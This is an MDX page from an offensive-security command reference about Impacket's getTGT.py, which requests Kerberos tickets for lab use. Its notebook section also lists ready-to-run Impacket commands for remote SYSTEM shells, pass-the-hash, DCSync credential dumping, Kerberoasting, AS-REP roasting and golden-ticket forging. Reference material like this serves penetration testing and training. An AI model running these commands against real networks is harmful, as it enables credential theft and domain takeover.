---
title: "getTGT.py"
sidebarTitle: "getTGT.py"
description: "Request a Kerberos TGT using known credentials."
keywords: ["getTGT", "getTGT.py", "impacket-getTGT"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/gettgt.md. Edit the Markdown source, then run scripts/sync_site.py. */}

Replace UPPER_CASE values with your lab values.

[Search this tool’s saved examples](/commands/notebook?tool=gettgt) · [All tools](/index)

## Commands

**Kali**

```bash
impacket-getTGT 'DOMAIN/USER:PASSWORD'
export KRB5CCNAME=USER.ccache
```

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

3 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="Original captured examples">

### Original captured examples

**Impacket: Script Quick Reference**

```bash
# remote execution (need admin creds or hash)
psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
smbexec.py / atexec.py / dcomexec.py        # alternatives
# credentials
secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
# tickets
getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
# shares / lookups
smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
```

</Accordion>

<Accordion title="Kali — obtain and inspect a ticket">

### Kali — obtain and inspect a ticket

**Kerberos when NTLM is unavailable**

```bash
impacket-getTGT 'DOMAIN_FQDN/USER' -dc-ip DC_IP
export KRB5CCNAME='/absolute/path/USER.ccache'
klist
```

</Accordion>

<Accordion title="Impacket: Script Quick Reference">

### Impacket: Script Quick Reference

**Impacket: Script Quick Reference**

Context from the notebook: Kerberos GetUserSPNs.py ,  GetNPUsers.py ,  getTGT.py ,  getST.py Kerberos tools

```text
getTGT.py
```

</Accordion>

</AccordionGroup>
